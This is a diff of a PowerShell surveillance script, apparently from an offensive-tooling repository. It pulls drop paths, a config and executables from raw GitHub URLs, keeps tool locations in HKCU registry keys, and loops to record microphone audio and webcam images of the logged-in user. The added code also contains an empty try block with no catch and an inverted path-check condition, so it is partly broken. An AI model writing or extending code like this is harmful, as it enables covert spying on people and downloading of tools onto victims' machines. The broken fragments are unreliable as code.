@@ -10,6 +10,12 @@ if(-not(Test-Path -Path $BaseDir -PathType Container)) {
     New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
 }
 
+function Get-Config{
+    try{
+        
+    }
+}
+
 function Get-Paths {
     $raw = (iwr -Uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/paths.txt).Content
     $dropPaths = $raw -split "`n"
@@ -25,9 +31,35 @@ function Get-Paths {
     } | ? { if($null -ne $_) { Test-Path -Path "$_" -PathType Container } }
 }
 
-$dropPaths = Get-Paths
-$mic_path = $dropPaths | Get-Random
-$cam_path = $dropPaths | Get-Random
+function Get-ToolPath {
+    param(
+        [string]$regKeyName,
+        [string]$valueName
+    )
+
+    try{
+        $content = (iwr -uri "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.txt" -UseBasicParsing).Content
+        $keyLine = ($content -split "`n" | Where-Object { $_ -like "$RegKeyName=*" }).Trim()
+        $valLine = ($content -split "`n" | Where-Object { $_ -like "$ValueName=*" }).Trim()
+        
+        if(-not $keyLine -or -not $valLine) { return $null }
+
+        $baseKey = $keyLine.Split('=')[1]
+        $keyValue = $valLine.Split('=')[1]
+        $baseKey = "HKCU:\$baseKey"
+
+        if(-not(Test-Path $baseKey)){
+            New-Item -Path $baseKey -Force | Out-Null
+        }
+
+        $item = Get-ItemProperty -Path $baseKey -Name $keyValue -ErrorAction SilentlyContinue
+        if(-not $item -and -not $item.$keyValue -and (Test-Path -Path $item.$keyValue -PathType Leaf)){
+            return $item.$keyValue
+        }
+        return $null
+    
+    }catch { return $null }
+}
 
 function Get-Tool {
     param(
@@ -42,6 +74,17 @@ function Get-Tool {
         } catch { " [-] Failed to download $name.exe: $($_.Message)" }
     }
     return $path
+}
+
+$dropPaths = Get-Paths
+
+$mic_path = Get-ToolPath -regKeyName "MicRegKey" -valueName "MicValueName"
+if(-not $mic_path){
+    $mic_path = $dropPaths | Get-Random
+}
+$cam_path = Get-ToolPath -regKeyName "CamRegKey" -valueName "CamValueName"
+if(-not $cam_path){
+    $cam_path = $dropPaths | Get-Random
 }
 
 try {
@@ -102,7 +145,7 @@ while ($true) {
         $micParam = @("-o", "$BaseDir\mic_$env:USERNAME.wav", "-d", "10")
         $camParam = @("-o", "$BaseDir\cam_$env:USERNAME.jpg")
         
-        Get-Process | Where-Object {$_.Path -eq $mic_path -or $_.Path -eq $cam_path} | ForEach-Object {
+        Get-Process | ? {$_.Path -eq "$mic_path" -or $_.Path -eq "$cam_path"} | % {
             try { $_.Kill(); } catch {}
         }
 
